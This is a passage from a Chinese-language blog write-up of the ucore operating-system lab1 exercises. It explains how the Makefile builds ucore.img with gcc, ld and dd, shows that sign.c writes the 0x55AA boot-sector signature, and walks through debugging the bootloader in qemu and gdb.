class="variable">$(V)</span><span class="variable">$(MAKE)</span> <span class="variable">$(MAKEOPTS)</span> clean</span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(SH)</span> tools/grade.sh</span><br><span class="line"></span><br><span class="line"><span class="section">touch:</span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(<span class="built_in">foreach</span> f,<span class="variable">$(TOUCH_FILES)</span>,<span class="variable">$(TOUCH)</span> <span class="variable">$(f)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="section">print-%:</span></span><br><span class="line">        @echo $(<span class="variable">$(<span class="built_in">shell</span> echo $(<span class="built_in">patsubst</span> print-%,%,<span class="variable">$@</span>)</span> | <span class="variable">$(TR)</span> [a-z] [A-Z]))</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">.PHONY</span>: clean dist-clean handin packall tags</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">        <span class="variable">$(V)</span><span class="variable">$(RM)</span> <span class="variable">$(GRADE_GDB_IN)</span> <span class="variable">$(GRADE_QEMU_OUT)</span> cscope* tags</span><br><span class="line">        -<span class="variable">$(RM)</span> -r <span class="variable">$(OBJDIR)</span> <span class="variable">$(BINDIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">dist-clean: clean</span></span><br><span class="line">        -<span class="variable">$(RM)</span> <span class="variable">$(HANDIN)</span></span><br><span class="line"></span><br><span class="line"><span class="section">handin: packall</span></span><br><span class="line">        @echo Please visit http://learn.tsinghua.edu.cn and upload <span class="variable">$(HANDIN)</span>. Thanks!</span><br><span class="line"></span><br><span class="line"><span class="section">packall: clean</span></span><br><span class="line">        @<span class="variable">$(RM)</span> -f <span class="variable">$(HANDIN)</span></span><br><span class="line">        @tar -czf <span class="variable">$(HANDIN)</span> `find . -type f -o -type d | grep -v '^\.*$$' | grep -vF '<span class="variable">$(HANDIN)</span>'`</span><br><span class="line"></span><br><span class="line"><span class="section">tags:</span></span><br><span class="line">        @echo TAGS ALL</span><br><span class="line">        <span class="variable">$(V)</span>rm -f cscope.files cscope.in.out cscope.out cscope.po.out tags</span><br><span class="line">        <span class="variable">$(V)</span>find . -type f -name <span class="string">"*.[chS]"</span> &gt;cscope.files</span><br><span class="line">        <span class="variable">$(V)</span>cscope -bq</span><br><span class="line">        <span class="variable">$(V)</span>ctags -L cscope.files</span><br></pre></td></tr></table></figure></div>
<p>   删除<code>bin</code>和<code>obj</code>文件夹 ，或者用<code>make clean</code>清除编译文件，运行下面命令得到<code>make</code>的详细信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ make <span class="string">"V="</span></span><br></pre></td></tr></table></figure></div>
   <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">   [~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; ls</span><br><span class="line">   bin  boot  kern  libs  Makefile  obj  q.log  tools</span><br><span class="line">   [~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">   moocos-&gt; rm -rf bin/ obj/</span><br><span class="line">   [~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">   moocos-&gt; ls</span><br><span class="line">   boot  kern  libs  Makefile  q.log  tools</span><br><span class="line">   [~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">   moocos-&gt; make <span class="string">"V="</span></span><br><span class="line">   + cc kern/init/init.c</span><br><span class="line">   gcc -Ikern/init/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/init/init.c -o obj/kern/init/init.o</span><br><span class="line">   kern/init/init.c:95:1: warning: ‘lab1_switch_test’ defined but not used [-Wunused-function]</span><br><span class="line">    lab1_switch_test(void) &#123;</span><br><span class="line">    ^</span><br><span class="line">   + cc kern/libs/readline.c</span><br><span class="line">   gcc -Ikern/libs/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/libs/readline.c -o obj/kern/libs/readline.o</span><br><span class="line">   + cc kern/libs/stdio.c</span><br><span class="line">   gcc -Ikern/libs/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/libs/stdio.c -o obj/kern/libs/stdio.o</span><br><span class="line">   + cc kern/debug/kdebug.c</span><br><span class="line">   gcc -Ikern/debug/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/debug/kdebug.c -o obj/kern/debug/kdebug.o</span><br><span class="line">   kern/debug/kdebug.c:251:1: warning: ‘read_eip’ defined but not used [-Wunused-function]</span><br><span class="line">    read_eip(void) &#123;</span><br><span class="line">    ^</span><br><span class="line">   + cc kern/debug/kmonitor.c</span><br><span class="line">   gcc -Ikern/debug/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/debug/kmonitor.c -o obj/kern/debug/kmonitor.o</span><br><span class="line">   + cc kern/debug/panic.c</span><br><span class="line">   gcc -Ikern/debug/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/debug/panic.c -o obj/kern/debug/panic.o</span><br><span class="line">   + cc kern/driver/clock.c</span><br><span class="line">   gcc -Ikern/driver/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/driver/clock.c -o obj/kern/driver/clock.o</span><br><span class="line">   + cc kern/driver/console.c</span><br><span class="line">   gcc -Ikern/driver/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/driver/console.c -o obj/kern/driver/console.o</span><br><span class="line">   + cc kern/driver/intr.c</span><br><span class="line">   gcc -Ikern/driver/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/driver/intr.c -o obj/kern/driver/intr.o</span><br><span class="line">   + cc kern/driver/picirq.c</span><br><span class="line">   gcc -Ikern/driver/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/driver/picirq.c -o obj/kern/driver/picirq.o</span><br><span class="line">   + cc kern/<span class="built_in">trap</span>/trap.c</span><br><span class="line">   gcc -Ikern/<span class="built_in">trap</span>/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/<span class="built_in">trap</span>/trap.c -o obj/kern/<span class="built_in">trap</span>/trap.o</span><br><span class="line">   kern/<span class="built_in">trap</span>/trap.c:14:13: warning: ‘print_ticks’ defined but not used [-Wunused-function]</span><br><span class="line">    static void <span class="function"><span class="title">print_ticks</span></span>() &#123;</span><br><span class="line">                ^</span><br><span class="line">   kern/<span class="built_in">trap</span>/trap.c:30:26: warning: ‘idt_pd’ defined but not used [-Wunused-variable]</span><br><span class="line">    static struct pseudodesc idt_pd = &#123;</span><br><span class="line">                             ^</span><br><span class="line">   + cc kern/<span class="built_in">trap</span>/trapentry.S</span><br><span class="line">   gcc -Ikern/<span class="built_in">trap</span>/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/<span class="built_in">trap</span>/trapentry.S -o obj/kern/<span class="built_in">trap</span>/trapentry.o</span><br><span class="line">   + cc kern/<span class="built_in">trap</span>/vectors.S</span><br><span class="line">   gcc -Ikern/<span class="built_in">trap</span>/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/<span class="built_in">trap</span>/vectors.S -o obj/kern/<span class="built_in">trap</span>/vectors.o</span><br><span class="line">   + cc kern/mm/pmm.c</span><br><span class="line">   gcc -Ikern/mm/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Ikern/debug/ -Ikern/driver/ -Ikern/<span class="built_in">trap</span>/ -Ikern/mm/ -c kern/mm/pmm.c -o obj/kern/mm/pmm.o</span><br><span class="line">   + cc libs/printfmt.c</span><br><span class="line">   gcc -Ilibs/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/  -c libs/printfmt.c -o obj/libs/printfmt.o</span><br><span class="line">   + cc libs/string.c</span><br><span class="line">   gcc -Ilibs/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/  -c libs/string.c -o obj/libs/string.o</span><br><span class="line">   + ld bin/kernel</span><br><span class="line">   ld -m    elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel  obj/kern/init/init.o obj/kern/libs/readline.o obj/kern/libs/stdio.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/debug/panic.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/intr.o obj/kern/driver/picirq.o obj/kern/<span class="built_in">trap</span>/trap.o obj/kern/<span class="built_in">trap</span>/trapentry.o obj/kern/<span class="built_in">trap</span>/vectors.o obj/kern/mm/pmm.o  obj/libs/printfmt.o obj/libs/string.o</span><br><span class="line">   + cc boot/bootasm.S</span><br><span class="line">   gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o</span><br><span class="line">   + cc boot/bootmain.c</span><br><span class="line">   gcc -Iboot/ -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootmain.c -o obj/boot/bootmain.o</span><br><span class="line">   + cc tools/sign.c</span><br><span class="line">   gcc -Itools/ -g -Wall -O2 -c tools/sign.c -o obj/sign/tools/sign.o</span><br><span class="line">   gcc -g -Wall -O2 obj/sign/tools/sign.o -o bin/sign</span><br><span class="line">   + ld bin/bootblock</span><br><span class="line">   ld -m    elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br><span class="line">   <span class="string">'obj/bootblock.out'</span> size: 472 bytes</span><br><span class="line">   build 512 bytes boot sector: <span class="string">'bin/bootblock'</span> success!</span><br><span class="line">   dd <span class="keyword">if</span>=/dev/zero of=bin/ucore.img count=10000</span><br><span class="line">   10000+0 records <span class="keyword">in</span></span><br><span class="line">   10000+0 records out</span><br><span class="line">   5120000 bytes (5.1 MB) copied, 0.0160073 s, 320 MB/s</span><br><span class="line">   dd <span class="keyword">if</span>=bin/bootblock of=bin/ucore.img conv=notrunc</span><br><span class="line">   1+0 records <span class="keyword">in</span></span><br><span class="line">   1+0 records out</span><br><span class="line">   512 bytes (512 B) copied, 0.000253753 s, 2.0 MB/s</span><br><span class="line">   dd <span class="keyword">if</span>=bin/kernel of=bin/ucore.img seek=1 conv=notrunc</span><br><span class="line">   138+1 records <span class="keyword">in</span></span><br><span class="line">   138+1 records out</span><br><span class="line">   70775 bytes (71 kB) copied, 0.000466247 s, 152 MB/s</span><br><span class="line">   [~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">   moocos-&gt; ls</span><br><span class="line">   bin  boot  kern  libs  Makefile  obj  q.log  tools</span><br></pre></td></tr></table></figure></div>
<p>   可以看到，ucore.img 通过make的最后三个dd命令生成：</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/uyia5N9.png" alt="image-20200307223319152"></p>
<p>对应Makefile文件命令为</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/07JYPSI.png" alt="image-20200307225339592"></p>
<p>第一个dd表示在<code>bin</code>文件夹下创建<code>ucore.img</code>，其大小为10000个块。</p>
<p>第二个dd表示将<code>/bin/bootblock</code>的内容复制到第一个块，其中<code>noerror</code>选项意味着如果发生错误，程序也将继续运行。</p>
<p>第三个dd表示从第二个块开始复制<code>/bin/kernel</code>中的内容，<code>seek</code>表示跳过第一个块开始写。</p>
<p>因此首先要先生成<code>bootlock</code>和<code>kernel</code>文件</p>
<p>kernel生成：</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/WLal3yd.png" alt="image-20200307225636354"></p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/G1nFH56.png" alt="image-20200307230243874"></p>
<p>对应Makefile文件命令为</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/x9DbijL.png" alt="image-20200307234603343"></p>
<blockquote>
<p>gcc命令参数解释<br>-I 添加搜索头文件的路径<br>-fno-builtin 不进行builtin函数的优化<br>-Wall 编译后显示所有警告<br>-ggdb 生成可供gdb使用的调试信息<br>-m32 生成适用于32位环境的代码<br>-gstabs 生成stabs格式的调试信息<br>-nostdinc 不使用标准库<br>-fno-stack-protector 不生成用于检测缓冲区溢出的代码<br>-Os 为减小代码大小而进行优化<br>-c只激活预处理,编译,和汇编,也就是他只把程序做成obj文件</p>
</blockquote>
<p>   由图可知，要生成文件<code>kernel</code>，需要将<code>obj/kern</code>文件夹下的所有<code>.c</code>文件编译生成<code>.o</code>文件,有如下文件：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">obj&#x2F;kern&#x2F;init&#x2F;init.o </span><br><span class="line">obj&#x2F;kern&#x2F;libs&#x2F;readline.o </span><br><span class="line">obj&#x2F;kern&#x2F;libs&#x2F;stdio.o </span><br><span class="line">obj&#x2F;kern&#x2F;debug&#x2F;kdebug.o </span><br><span class="line">obj&#x2F;kern&#x2F;debug&#x2F;kmonitor.o </span><br><span class="line">obj&#x2F;kern&#x2F;debug&#x2F;panic.o </span><br><span class="line">obj&#x2F;kern&#x2F;driver&#x2F;clock.o </span><br><span class="line">obj&#x2F;kern&#x2F;driver&#x2F;console.o </span><br><span class="line">obj&#x2F;kern&#x2F;driver&#x2F;intr.o </span><br><span class="line">obj&#x2F;kern&#x2F;driver&#x2F;picirq.o </span><br><span class="line">obj&#x2F;kern&#x2F;trap&#x2F;trap.o </span><br><span class="line">obj&#x2F;kern&#x2F;trap&#x2F;trapentry.o </span><br><span class="line">obj&#x2F;kern&#x2F;trap&#x2F;vectors.o </span><br><span class="line">obj&#x2F;kern&#x2F;mm&#x2F;pmm.o  </span><br><span class="line">obj&#x2F;libs&#x2F;printfmt.o </span><br><span class="line">obj&#x2F;libs&#x2F;string.o</span><br></pre></td></tr></table></figure></div>
<p>   然后用<code>ld</code>命令将这些<code>.o</code>文件生成一个可执行文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">   + ld bin/bootblock</span><br><span class="line">ld -m    elf_i386 -nostdlib -T tools/kernel.ld -o bin/kernel  obj/kern/init/init.o obj/kern/libs/readline.o obj/kern/libs/stdio.o obj/kern/debug/kdebug.o obj/kern/debug/kmonitor.o obj/kern/debug/panic.o obj/kern/driver/clock.o obj/kern/driver/console.o obj/kern/driver/intr.o obj/kern/driver/picirq.o obj/kern/<span class="built_in">trap</span>/trap.o obj/kern/<span class="built_in">trap</span>/trapentry.o obj/kern/<span class="built_in">trap</span>/vectors.o obj/kern/mm/pmm.o  obj/libs/printfmt.o obj/libs/string.o</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>ld命令参数解释<br>-m    elf_i386表示模拟指定的连接器为<strong>elf_i386</strong><br>-T tools/kernel.ld表示使用<strong>tools/kernel.ld</strong>作为链接器脚本。此脚本将替换ld的默认链接器脚本（而不是添加到其中）。<br>-o bin/kernel表示将输出文件在bin文件夹下，文件名为<strong>kernel</strong><br>后面跟着的<code>.o</code>文件是所要转化的文件</p>
</blockquote>
<p>   bootlock生成<br>   <img src="/images/loading.gif" data-original="/posts/335ac3b4/rDceM5H.png" alt="image-20200307234212505"></p>
<p>   对应的Makefile命令为</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/JFXM7Bl.png" alt="image-20200307234724465"></p>
<p>可以看到，要生成bootlock，需要先生成<code>bootams.o, bootmian.c, sign.c</code></p>
<blockquote>
<p>gcc命令参数解释<br>-I 添加搜索头文件的路径<br>-fno-builtin 不进行builtin函数的优化<br>-Wall 编译后显示所有警告<br>-ggdb 生成可供gdb使用的调试信息<br>-m32 生成适用于32位环境的代码<br>-gstabs 生成stabs格式的调试信息<br>-nostdinc 不使用标准库<br>-fno-stack-protector 不生成用于检测缓冲区溢出的代码<br>-Os 为减小代码大小而进行优化<br>-c只激活预处理,编译,和汇编,也就是他只把程序做成obj文件</p>
</blockquote>
<p>   生成bootfile对应的源码由宏定义批量实现</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/QKWzrdM.png" alt="image-20200308000103617"></p>
<p>生成sign对应的Makefile源码为</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/IBotCQg.png" alt="image-20200307235431536"></p>
<p>最后用ld命令生成</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">   + ld bin/bootblock</span><br><span class="line">ld -m    elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>ld命令参数解释<br>-m    elf_i386表示模拟指定的连接器为<strong>elf_i386</strong><br>-nostdlib 表示不连接系统标准启动文件和标准库文件，只把指定的文件传递给连接器。这个选项常用于编译内核、bootloader等程序，它们不需要启动文件、标准库文件。<br>-N 设置代码段和数据段均可读写<br>-e 指定入口<br>start 代码段开始于<br>-Ttext 制定代码段开始位置<br>-o obj/bootblock.o表示将输出文件在obj文件夹下，文件名为bootblock</p>
</blockquote>
<ol>
<li><p>系统认为是符合规范的硬盘主引导扇区的特征是什么？</p>
<p>查看sign.c文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">moocos-&gt; ls tools/</span><br><span class="line">function.mk  gdbinit  grade.sh  kernel.ld  sign.c  <span class="built_in">vector</span>.c</span><br><span class="line">[~/Desktop/ucore_lab/labcodes/lab1]</span><br><span class="line">moocos-&gt; cat tools/sign.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[]) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: &lt;input filename&gt; &lt;output filename&gt;\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stat(argv[<span class="number">1</span>], &amp;st) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error opening file '%s': %s\n"</span>, argv[<span class="number">1</span>], strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"'%s' size: %lld bytes\n"</span>, argv[<span class="number">1</span>], (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; <span class="number">510</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%lld &gt;&gt; 510!!\n"</span>, (<span class="keyword">long</span> <span class="keyword">long</span>)st.st_size);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    FILE *ifp = fopen(argv[<span class="number">1</span>], <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = fread(buf, <span class="number">1</span>, st.st_size, ifp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> != st.st_size) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"read '%s' error, size is %d.\n"</span>, argv[<span class="number">1</span>], <span class="built_in">size</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ifp);</span><br><span class="line">    buf[<span class="number">510</span>] = <span class="number">0x55</span>;</span><br><span class="line">    buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</span><br><span class="line">    FILE *ofp = fopen(argv[<span class="number">2</span>], <span class="string">"wb+"</span>);</span><br><span class="line">    <span class="built_in">size</span> = fwrite(buf, <span class="number">1</span>, <span class="number">512</span>, ofp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">size</span> != <span class="number">512</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"write '%s' error, size is %d.\n"</span>, argv[<span class="number">2</span>], <span class="built_in">size</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(ofp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"build 512 bytes boot sector: '%s' success!\n"</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>得知一个被系统认为是符合规范的硬盘主引导扇区的特征有以下几点：<br>- 磁盘主引导扇区只有512字节<br>- 磁盘最后两个字节为<code>0x55AA</code></p>
</li>
</ol>
<h1 id="练习2：使用qemu执行并调试lab1中的软件。"><a href="#练习2：使用qemu执行并调试lab1中的软件。" class="headerlink" title="练习2：使用qemu执行并调试lab1中的软件。"></a>练习2：使用qemu执行并调试lab1中的软件。</h1><p>为了熟悉使用qemu和gdb进行的调试工作，我们进行如下的小练习：</p>
<ol>
<li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p>
</li>
<li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p>
</li>
<li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p>
</li>
<li><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
</li>
</ol>
<h2 id="练习2-1"><a href="#练习2-1" class="headerlink" title="练习2.1"></a>练习2.1</h2><p>首先修改文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">moocos-&gt; vim tools/gdbinit</span><br></pre></td></tr></table></figure></div>
<p>增加set architecture i8086 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">file bin&#x2F;kernel</span><br><span class="line">set architecture i8086 #增添语句</span><br><span class="line">target remote :1234</span><br><span class="line">break kern_init</span><br><span class="line">continue</span><br></pre></td></tr></table></figure></div>
<p>在GUI界面lab1目录下，执行如下语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">make debug</span><br></pre></td></tr></table></figure></div>
<p>ssh环境下执行会报错</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/3Zx710h.png" alt></p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/1CjGbqJ.png" alt="image-20200308015334271"></p>
<p>之后使用<code>si</code>命令可使BIOS单步执行</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/iVPwSz3.png" alt="image-20200308015709679"></p>
<p>在gdb中执行x /2i  \$pc 来看BIOS的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">x &#x2F;2i $pc #显示当前eip处的汇编指令</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/eeriLFh.png" alt="image-20200308015905107"></p>
<h2 id="练习2-2"><a href="#练习2-2" class="headerlink" title="练习2.2"></a>练习2.2</h2><p>在 tools/gdbinit中加入中断</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">target remote :1234     &#x2F;&#x2F;连接qemu，此时qemu会进入停止状态，听从gdb的命令</span><br><span class="line">set architecture i8086  &#x2F;&#x2F;设置当前调试的CPU是8086</span><br><span class="line">b *0x7c00   &#x2F;&#x2F;在0x7c00处设置断点。此地址是bootloader入口点地址，可看boot&#x2F;bootasm.S的start地址处</span><br><span class="line">c     &#x2F;&#x2F;continue简称，表示继续执行</span><br><span class="line">x&#x2F;10i $pc    &#x2F;&#x2F;显示当前eip处的汇编指令</span><br></pre></td></tr></table></figure></div>
<p>重新<code>make debug</code>得到</p>
<p><img src="/images/loading.gif" data-original="/posts/335ac3b4/iEnaW4q.png" alt="image-20200308022217191"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&gt; 0x7c00:      cli    </span><br><span class="line">   0x7c01:      cld  </span><br><span class="line">   0x7c02:      xor    %ax,%ax</span><br><span class="line">   0x7c04:      mov    %ax,%ds</span><br><span class="line">   0x7c06:      mov    %ax,%es</span><br><span class="line">   0x7c08:      mov    %ax,%ss</span><br><span class="line">   0x7c0a:      in     $0x64,%al</span><br><span class="line">   0x7c0c:      test   $0x2,%al</span><br><span class="line">   0x7c0e:      jne    0x7c0a</span><br><span class="line">   0x7c10:      mov    $0xd1,%al</span><br></pre></td></tr></table></figure></div>
<h2 id="练习2-3"><a href="#练习2-3" class="headerlink" title="练习2.3"></a>练习2.3</h2><p>查看bootasm.S</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">moocos-&gt; cat bootasm.S -n</span><br><span class="line">     1  #include &lt;asm.h&gt;</span><br><span class="line">     2</span><br><span class="line">     </span><br><span class="line">     3  # Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="line">     4  # The BIOS loads this code from the first sector of the hard disk into</span><br><span class="line">     5  # memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="line">     6  # with %cs&#x3D;0 %ip&#x3D;7c00.</span><br><span class="line">     7</span><br><span class="line">     8  .set PROT_MODE_CSEG,        0x8                     # kernel code segment selector</span><br><span class="line">     9  .set PROT_MODE_DSEG,        0x10                    # kernel data segment selector</span><br><span class="line">    10  .set CR0_PE_ON,             0x1                     # protected mode enable flag</span><br><span class="line">    11</span><br><span 